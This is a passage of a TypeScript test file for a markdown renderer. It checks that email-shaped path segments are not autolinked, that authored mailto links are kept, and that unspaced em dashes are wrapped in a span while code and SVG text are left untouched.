    expect(labels(html)).toEqual(['A', 'B', 'C', 'D']);
  });
});

describe('renderMarkdown email autolinks inside a path', () => {
  it('leaves an email-shaped path segment as plain text', () => {
    const html = renderMarkdown('DMG: file:///Users/me.x@example.com/p/Lucidos.dmg', { cache: false });
    expect(html).not.toContain('mailto:');
    expect(html).toContain('file:///Users/me.x@example.com/p/Lucidos.dmg');
  });

  it('leaves an absolute path with an email-shaped segment as plain text', () => {
    const html = renderMarkdown('open "/Users/me.x@example.com/p/Lucidos.dmg"', { cache: false });
    expect(html).not.toContain('mailto:');
  });

  it('keeps an authored email link after a slash', () => {
    for (const md of ['/[me.x@example.com](mailto:me.x@example.com)', '/<me.x@example.com>']) {
      expect(renderMarkdown(md, { cache: false })).toContain('<a href="mailto:me.x@example.com">');
    }
  });

  it('leaves no autolink marker in the output', () => {
    expect(renderMarkdown('Write to me.x@example.com today', { cache: false })).not.toContain('data-');
  });

  it('still autolinks an email in prose', () => {
    const html = renderMarkdown('Write to me.x@example.com today', { cache: false });
    expect(html).toContain('<a href="mailto:me.x@example.com">me.x@example.com</a>');
  });
});

describe('renderMarkdown unspaced em dashes', () => {
  const EM = String.fromCharCode(0x2014);
  const gaps = (html: string): number => (html.match(/class="em-dash-gap"/g) ?? []).length;
  const text = (html: string): string => {
    const div = document.createElement('div');
    div.innerHTML = html;
    return div.textContent ?? '';
  };

  it('wraps an unspaced em dash so it cannot read as a hyphen', () => {
    const html = renderMarkdown(`couldn't start${EM}another thread`, { cache: false });
    expect(html).toContain(`start<span class="em-dash-gap">${EM}</span>another`);
  });

  it('wraps a one-sided em dash', () => {
    expect(gaps(renderMarkdown(`left ${EM}right`, { cache: false }))).toBe(1);
    expect(gaps(renderMarkdown(`left${EM} right`, { cache: false }))).toBe(1);
  });

  it('leaves a spaced em dash alone', () => {
    const html = renderMarkdown(`start ${EM} another\n\n${EM} opens a line`, { cache: false });
    expect(gaps(html)).toBe(0);
  });

  it('treats a line break as a space', () => {
    expect(gaps(renderMarkdown(`first line\n${EM} second line`, { cache: false }))).toBe(0);
  });

  it('reads the neighbour across inline markup', () => {
    expect(gaps(renderMarkdown(`**bold**${EM} next`, { cache: false }))).toBe(1);
    expect(gaps(renderMarkdown(`word**${EM}** next`, { cache: false }))).toBe(1);
    expect(gaps(renderMarkdown(`word **${EM}** next`, { cache: false }))).toBe(0);
  });

  it('leaves SVG text alone, where a span would not survive', () => {
    const svg = `<svg width="10"><text x="1">A${EM}B</text></svg>`;
    expect(gaps(renderMarkdown(svg, { cache: false }))).toBe(0);
  });

  it('never touches code', () => {
    const html = renderMarkdown(`\`a${EM}b\`\n\n\`\`\`\nx${EM}y\n\`\`\``, { cache: false });
    expect(gaps(html)).toBe(0);
  });

  it('keeps the text exactly as written', () => {
    const md = `one${EM}two, three ${EM} four, five${EM}six`;
    const html = renderMarkdown(md, { cache: false });
    expect(gaps(html)).toBe(2);
    expect(text(html).trim()).toBe(md);
  });
});
